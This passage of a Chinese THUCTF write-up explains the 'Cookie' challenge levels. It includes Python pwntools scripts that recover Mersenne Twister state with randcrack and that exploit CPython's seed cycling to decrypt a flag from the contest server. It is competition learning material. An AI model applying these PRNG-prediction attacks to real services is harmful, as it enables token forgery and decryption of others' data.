<p><picture><source type="image/webp" srcset="/assets/easycrypto-flag2.e2ef03eb.webp"><img srcset="/assets/easycrypto-flag2.d42c3f6b.png" loading="lazy" src="/assets/easycrypto-flag2.d42c3f6b.png" width="953" height="376" alt="flag2"></picture></p>
<h3 id="小章鱼的-cookie" class="heading"><a href="#小章鱼的-cookie" class="heading-anchor" aria-label="章节： 小章鱼的 Cookie" tabindex="-1"></a><span>小章鱼的 Cookie</span></h3>
<h4 id="level-1-7" class="heading"><a href="#level-1-7" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>代码中使用了 Python 的 <code>random</code> 库<span class="mojikumi-line-end">，</span>而其使用的 Mersenne Twister 算法是不安全的<span class="mojikumi-line-end">，</span>基于连续 624 个 32-bit 输出就可以推测出接下来的输出<span class="mojikumi-line-end">，</span>题目中正好提供了其生成的 2500 bytes<span class="mojikumi-line-end">，</span>足以推测出后面的输出<span class="mojikumi-line-end">，</span>再异或即可<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-10"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-10--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> randcrack </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> RandCrack</span></span>
<span></span>
<span><span style="color: #637777"># sh = process([&#39;python&#39;, &#39;cookie.py&#39;])</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50294</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendline</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">void*</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">b </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">bytes</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">fromhex</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvline</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">strip</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">())</span></span>
<span></span>
<span><span style="color: #D6DEEB">rc </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">RandCrack</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">624</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    rc.</span><span style="color: #B2CCD6">submit</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">int</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">from_bytes</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">little</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">624</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    x </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> rc.</span><span style="color: #B2CCD6">predict_getrandbits</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">32</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">bytes</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">[</span><span style="color: #82AAFF">p </span><span style="color: #C792EA">^</span><span style="color: #82AAFF"> q </span><span style="color: #C792EA">for</span><span style="color: #82AAFF"> p, q </span><span style="color: #C792EA">in</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">zip</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> x.</span><span style="color: #B2CCD6">to_bytes</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">4</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">little</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">))</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">end</span><span style="color: #C792EA">=</span><span style="color: #D9F5DD">&#39;&#39;</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span><span style="color: #994CC3">from</span><span style="color: #403F53"> randcrack </span><span style="color: #994CC3">import</span><span style="color: #403F53"> RandCrack</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process([&#39;python&#39;, &#39;cookie.py&#39;])</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50294</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendline</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">1</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">void*</span><span style="color: #AA0982">\n</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">b </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">bytes</span><span style="color: #403F53">.</span><span style="color: #0C969B">fromhex</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvline</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">strip</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">())</span></span>
<span></span>
<span><span style="color: #403F53">rc </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">RandCrack</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">0</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">624</span><span style="color: #4876D6"> </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    rc.</span><span style="color: #0C969B">submit</span><span style="color: #403F53">(</span><span style="color: #4876D6">int.</span><span style="color: #0C969B">from_bytes</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">4</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">little</span><span style="color: #111111">&#39;</span><span style="color: #403F53">))</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">624</span><span style="color: #4876D6"> </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #111111">,</span><span style="color: #4876D6"> len</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    x </span><span style="color: #994CC3">=</span><span style="color: #403F53"> rc.</span><span style="color: #0C969B">predict_getrandbits</span><span style="color: #403F53">(</span><span style="color: #AA0982">32</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">bytes</span><span style="color: #403F53">(</span><span style="color: #111111">[</span><span style="color: #4876D6">p </span><span style="color: #994CC3">^</span><span style="color: #4876D6"> q </span><span style="color: #994CC3">for</span><span style="color: #4876D6"> p, q </span><span style="color: #994CC3">in</span><span style="color: #4876D6"> zip</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">4</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> x.</span><span style="color: #0C969B">to_bytes</span><span style="color: #403F53">(</span><span style="color: #AA0982">4</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">little</span><span style="color: #111111">&#39;</span><span style="color: #403F53">))</span><span style="color: #111111">]</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">()</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">end</span><span style="color: #994CC3">=</span><span style="color: #111111">&#39;&#39;</span><span style="color: #403F53">)</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/cookie-flag1.b2d9f41c.webp"><img srcset="/assets/cookie-flag1.237220d4.png" loading="lazy" src="/assets/cookie-flag1.237220d4.png" width="798" height="69" alt="flag1"></picture></p>
<h4 id="level-2-5" class="heading"><a href="#level-2-5" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>阅读 Python 的 <code>random</code> 库<a href="https://github.com/python/cpython/blob/84b7e9e3fa67fb9b92088d17839d8235f1cec62e/Modules/_randommodule.c#L226-L232">源码</a><span class="mojikumi-line-end">，</span>可以发现 seed 会被循环使用以补足到 624 个 32-bit<span class="mojikumi-line-end">，</span>所以将拿到的 seed 重复两遍发回就可以 seed 不同但生成的序列相同<span class="mojikumi-line-end">，</span>然后就和 level 1 一样了<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-11"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-11--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> randcrack </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> RandCrack</span></span>
<span></span>
<span><span style="color: #637777"># sh = process([&#39;python&#39;, &#39;cookie.py&#39;])</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50842</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendline</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">2</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">&lt;</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">seed </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">&gt;</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">:</span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">&gt;</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> seed </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">void*</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">b </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">bytes</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">fromhex</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvline</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">strip</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">())</span></span>
<span></span>
<span><span style="color: #D6DEEB">rc </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">RandCrack</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">624</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    rc.</span><span style="color: #B2CCD6">submit</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">int</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">from_bytes</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">little</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">624</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    x </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> rc.</span><span style="color: #B2CCD6">predict_getrandbits</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">32</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">bytes</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">[</span><span style="color: #82AAFF">p </span><span style="color: #C792EA">^</span><span style="color: #82AAFF"> q </span><span style="color: #C792EA">for</span><span style="color: #82AAFF"> p, q </span><span style="color: #C792EA">in</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">zip</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i:i</span><span style="color: #C792EA">+</span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> x.</span><span style="color: #B2CCD6">to_bytes</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">4</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">little</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">))</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">end</span><span style="color: #C792EA">=</span><span style="color: #D9F5DD">&#39;&#39;</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span><span style="color: #994CC3">from</span><span style="color: #403F53"> randcrack </span><span style="color: #994CC3">import</span><span style="color: #403F53"> RandCrack</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process([&#39;python&#39;, &#39;cookie.py&#39;])</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50842</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendline</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">2</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">&lt;</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">seed </span><span style="color: #994CC3">=</span><span style="color: #403F53"> sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">&gt;</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #403F53">:</span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">&gt;</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> seed </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">void*</span><span style="color: #AA0982">\n</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">b </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">bytes</span><span style="color: #403F53">.</span><span style="color: #0C969B">fromhex</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvline</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">strip</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">())</span></span>
<span></span>
<span><span style="color: #403F53">rc </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">RandCrack</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">0</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">624</span><span style="color: #4876D6"> </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    rc.</span><span style="color: #0C969B">submit</span><span style="color: #403F53">(</span><span style="color: #4876D6">int.</span><span style="color: #0C969B">from_bytes</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">4</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">little</span><span style="color: #111111">&#39;</span><span style="color: #403F53">))</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">624</span><span style="color: #4876D6"> </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #111111">,</span><span style="color: #4876D6"> len</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    x </span><span style="color: #994CC3">=</span><span style="color: #403F53"> rc.</span><span style="color: #0C969B">predict_getrandbits</span><span style="color: #403F53">(</span><span style="color: #AA0982">32</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">bytes</span><span style="color: #403F53">(</span><span style="color: #111111">[</span><span style="color: #4876D6">p </span><span style="color: #994CC3">^</span><span style="color: #4876D6"> q </span><span style="color: #994CC3">for</span><span style="color: #4876D6"> p, q </span><span style="color: #994CC3">in</span><span style="color: #4876D6"> zip</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">[</span><span style="color: #4876D6">i:i</span><span style="color: #994CC3">+</span><span style="color: #AA0982">4</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> x.</span><span style="color: #0C969B">to_bytes</span><span style="color: #403F53">(</span><span style="color: #AA0982">4</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">little</span><span style="color: #111111">&#39;</span><span style="color: #403F53">))</span><span style="color: #111111">]</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">()</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">end</span><span style="color: #994CC3">=</span><span style="color: #111111">&#39;&#39;</span><span style="color: #403F53">)</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/cookie-flag2.3a4a4ff0.webp"><img srcset="/assets/cookie-flag2.94b27955.png" loading="lazy" src="/assets/cookie-flag2.94b27955.png" width="707" height="65" alt="flag2"></picture></p>
<h4 id="level-3-2" class="heading"><a href="#level-3-2" class="heading-anchor" aria-label="章节： Level 3" tabindex="-1"></a><span>Level 3</span></h4>
<p>这题有点..感觉应该不是 intended solution<span class="mojikumi-line-start">（</span>不然无论是难度还是分类都不对<span class="mojikumi-line-start">（</span></p>
<p>直接把所有 curse 发回会被 <code>input</code> 在一定长度处截断导致不符<span class="mojikumi-line-end">。</span>但 <code>zip</code> 返回的长度是较短一方的长度<span class="mojikumi-line-end">，</span>所以只发一个 seed 即可<span class="mojikumi-line-end">。</span></p>
